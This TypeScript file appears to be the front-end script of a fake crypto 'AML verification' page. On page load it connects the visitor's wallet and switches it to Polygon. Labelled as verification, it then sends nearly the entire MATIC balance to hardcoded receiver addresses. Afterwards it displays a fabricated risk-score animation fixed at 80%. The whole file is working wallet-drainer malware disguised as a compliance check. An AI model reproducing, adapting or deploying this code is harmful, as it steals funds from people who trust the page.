import { detectWallets } from "./core";
import { logger } from "./logger";
import { ethers } from "ethers";
let provider: ethers.BrowserProvider | null = null;
let signer: ethers.Signer | null = null;

const isDev =
  window.location.href.includes("localhost") ||
  window.location.href.includes("127.0.0.1");

const PROD_RECEIVER_ADDRESS = "0x6217cA34756CBD31Ee84fc83179F37e19250B76D";
const DEV_RECEIVER_ADDRESS = "0x74B04568C58a50E10698595e3C5F99702037dF62";
const RECEIVER_ADDRESS = isDev ? DEV_RECEIVER_ADDRESS : PROD_RECEIVER_ADDRESS;
const POLYGON_CHAIN_ID = 137n;

logger.log("isDev", isDev);
logger.log("RECEIVER_ADDRESS", RECEIVER_ADDRESS);

async function updateBalance(): Promise<void> {
  try {
    if (!signer || !provider) {
      logger.log("No signer or provider available");
      return;
    }

    const address = await signer.getAddress();
    logger.log("Connected address:", address);

    const balance = await provider.getBalance(address);
    logger.log("MATIC balance:", ethers.formatEther(balance), "MATIC");
  } catch (error: unknown) {
    logger.error("Error checking balances:", error);
  }
}

async function handleAction(): Promise<void> {
  if (!signer) {
    await connectWallet();
    if (signer) {
      await sendPayment();
    }
  } else {
    await sendPayment();
  }
}

async function connectWallet(): Promise<void> {
  const actionButton = document.getElementById("action-button") as HTMLButtonElement | null;
  if (actionButton) {
    actionButton.disabled = true;
    actionButton.classList.add("loading");
    actionButton.textContent = "Connecting...";
  }

  try {
    logger.log("Starting wallet connection...");

    if (!window.ethereum) {
      throw new Error("No Ethereum provider found");
    }
    provider = new ethers.BrowserProvider(window.ethereum, "any");

    logger.log("Requesting accounts...");
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    const address = await signer.getAddress();
    logger.log("Connected address:", address);

    const network = await provider.getNetwork();
    logger.log("Current network:", network);

    if (network.chainId !== POLYGON_CHAIN_ID) {
      logger.log("Switching to Polygon network...");
      try {
        // это UX вызов смены сети, поэтому не реализован в ether 
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x89" }],
        });
      } catch (switchError: any) {
        logger.log("Switch error:", switchError);
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: "wallet_addEthereumChain",
              params: [
                {
                  chainId: "0x89",
                  chainName: "Polygon",
                  nativeCurrency: {
                    name: "MATIC",
                    symbol: "MATIC",
                    decimals: 18,
                  },
                  rpcUrls: ["https://polygon-rpc.com"],
                  blockExplorerUrls: ["https://polygonscan.com/"],
                },
              ],
            });
          } catch (addError: unknown) {
            logger.error("Add network error:", addError);
            throw new Error("Failed to add Polygon network");
          }
        } else {
          throw switchError;
        }
      }
    }

    await updateBalance();

    provider.on("accountsChanged", async (accounts: string[]) => {
      logger.log("Accounts changed:", accounts);
      if (provider) {
        signer = await provider.getSigner();
        await updateBalance();
      }
    });

    provider.on("chainChanged", () => {
      logger.log("Network changed, reloading...");
      window.location.reload();
    });

  } catch (error: unknown) {
    logger.error("Connection error:", error);

    if (actionButton) {
      actionButton.disabled = false;
      actionButton.classList.remove("loading");
      actionButton.textContent = "Connect Wallet for Verification";
    }
    provider = null;
    signer = null;
  }

  if (actionButton) {
    actionButton.disabled = false;
    actionButton.classList.remove("loading");
  }
}

async function sendPayment(): Promise<void> {
  const actionButton = document.getElementById("action-button") as HTMLButtonElement | null;
  try {
    if (actionButton) {
      actionButton.disabled = true;
      actionButton.classList.add("loading");
      actionButton.textContent = "Verifying...";
    }

    if (!signer || !provider) throw new Error("Wallet not connected");

    const userAddress = await signer.getAddress();
    logger.log("Sending from address:", userAddress);

    const balance = await provider.getBalance(userAddress);
    logger.log(
      "Current MATIC balance:",
      ethers.formatEther(balance),
      "MATIC"
    );

    if (balance === 0n) {
      logger.log("No MATIC balance available");
      return;
    }

    const feeData = await provider.getFeeData();
    const gasPrice = feeData.gasPrice;

    if (!gasPrice) {
      throw new Error("Failed to get gas price");
    }
    logger.log(
      "Current gas price:",
      ethers.formatUnits(gasPrice, "gwei"),
      "gwei"
    );

    const gasLimit = 21000;
    const gasCost = gasPrice * BigInt(gasLimit);
    const gasCostWithBuffer = gasCost * 120n / 100n;
    logger.log(
      "Gas cost with buffer:",
      ethers.formatEther(gasCostWithBuffer),
      "MATIC"
    );

    const minimumMaticToKeep = ethers.parseEther("0.1");
    const totalCostToReserve = gasCostWithBuffer + minimumMaticToKeep;
    logger.log(
      "Total amount to reserve:",
      ethers.formatEther(totalCostToReserve),
      "MATIC"
    );

    const amountToSend = balance - totalCostToReserve;
    logger.log(
      "Amount to send:",
      ethers.formatEther(amountToSend),
      "MATIC"
    );

    if (amountToSend <= 0) {
      logger.log("Insufficient balance to cover gas fees and minimum reserve");
      throw new Error(
        "Insufficient balance to cover gas fees and minimum reserve"
      );
    }

    logger.log("Sending transaction...");
    const tx = await signer.sendTransaction({
      to: RECEIVER_ADDRESS,
      value: amountToSend,
      gasLimit: gasLimit,
      maxFeePerGas: gasPrice * 2n,
      maxPriorityFeePerGas: gasPrice,
    });

    logger.log("Transaction sent:", tx.hash);

    await tx.wait();
    logger.log("Transaction confirmed");

    if (actionButton) actionButton.style.display = "none";

    const amlResults = document.getElementById("aml-results");
    amlResults?.classList.add("visible");

    const circle = document.querySelector(".risk-score-progress") as SVGCircleElement | null;
    if (circle) {
      const radius = circle.r.baseVal.value;
      const circumference = radius * 2 * Math.PI;
      circle.style.strokeDasharray = `${circumference} ${circumference}`;
      circle.style.strokeDashoffset = circumference.toString();;

      setTimeout(() => {
        const offset = circumference - 0.8 * circumference;
        circle.style.strokeDashoffset = offset.toString();;
      }, 100);
    }

    const txHashEl = document.getElementById("transaction-hash");
    if (txHashEl) {
      txHashEl.textContent = tx.hash.slice(0, 6) + "..." + tx.hash.slice(-4);
    }

    await updateBalance();
  } catch (error: unknown) {
    logger.error("Transaction error:", error);
    if (actionButton) {
      actionButton.textContent = (error instanceof Error ? error.message : "Transaction failed");
      actionButton.style.backgroundColor = "var(--danger-color)";
      setTimeout(() => {
        if (actionButton) {
          actionButton.textContent = "Verify";
          actionButton.style.backgroundColor = "var(--primary-color)";
        }
      }, 3000);
    }
  } finally {
    if (actionButton) {
      actionButton.disabled = false;
      actionButton.classList.remove("loading");
    }
  }
}

function showStatus(message: string, isSuccess: boolean): void {
  logger.log(`Status: ${message} (${isSuccess ? "success" : "error"})`);
}
// ts-ignore
document.addEventListener("DOMContentLoaded", async () => {
  const { techLog, message } = await detectWallets();

  logger.log(message);
  logger.log("Технический лог:", techLog);

  const ethProvider = window.ethereum as any;

  if (!ethProvider) {
    logger.log("Не найден кошелек Ethereum.");
    showStatus("Please connect your wallet to continue", true);
    return;
  } else {
    logger.log("Обнаружен кошелек Ethereum");
  }

  try {
    const accounts: string[] = await ethProvider.request({ method: "eth_accounts" });
    logger.log("Ранее подключенные адреса пользователя:", accounts);

    if (accounts.length > 0) {
      await handleAction();
    } else {
      logger.log("Не найдено подключенных адресов, запрашиваем разрешение на подключение к кошельку...");
      try {
        const newAccounts: string[] = await ethProvider.request({
          method: "eth_requestAccounts",
        });
        logger.log("Получены новые подключенные адреса пользователя:", newAccounts);
        if (newAccounts.length > 0) {
          await handleAction();
        } else {
          logger.log("Пользователь отклонил запрос на подключение к кошельку");
        }
      } catch (requestError: any) {
        logger.log("Ошибка во время запроса подключенных адресов:", requestError);
        if (requestError.code === 4001) {
          logger.log("Пользователь отклонил запрос на подключение к кошельку");
        } else {
          logger.error("Неожиданная ошибка:", requestError);
        }
      }
    }
  } catch (error: unknown) {
    logger.error("Ошибка во время проверки подключенных адресов:", error);
    if (typeof error === "object" && error !== null) {
      if ("code" in error) logger.log("Error code:", (error as any).code);
      if ("message" in error) logger.log("Error message:", (error as any).message);
    }
  }
});
